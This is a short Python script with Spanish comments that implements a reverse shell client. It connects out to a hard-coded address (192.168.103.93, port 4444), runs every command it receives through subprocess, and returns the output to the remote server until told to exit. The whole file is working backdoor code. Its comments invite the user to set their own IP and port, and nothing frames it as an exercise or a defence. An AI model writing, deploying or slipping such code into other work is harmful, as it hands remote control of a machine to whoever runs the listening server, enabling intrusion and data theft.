import socket
import subprocess
import os

# Definimos la dirección IP y el puerto del servidor
HOST = '192.168.103.93'  # Cambia esta dirección IP por la del servidor
PORT = 4444         # Cambia este puerto por el puerto del servidor

# Creamos un socket para la conexión
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Nos conectamos al servidor
s.connect((HOST, PORT))

# Interacción con el servidor
while True:
    # Recibimos el comando del servidor
    command = s.recv(1024).decode()
    
    # Si el comando es "exit", cerramos la conexión
    if command.strip() == "exit":
        break
    
    # Ejecutamos el comando y enviamos el resultado al servidor
    output = subprocess.getoutput(command)
    s.send(output.encode())

# Cerramos la conexión
s.close()
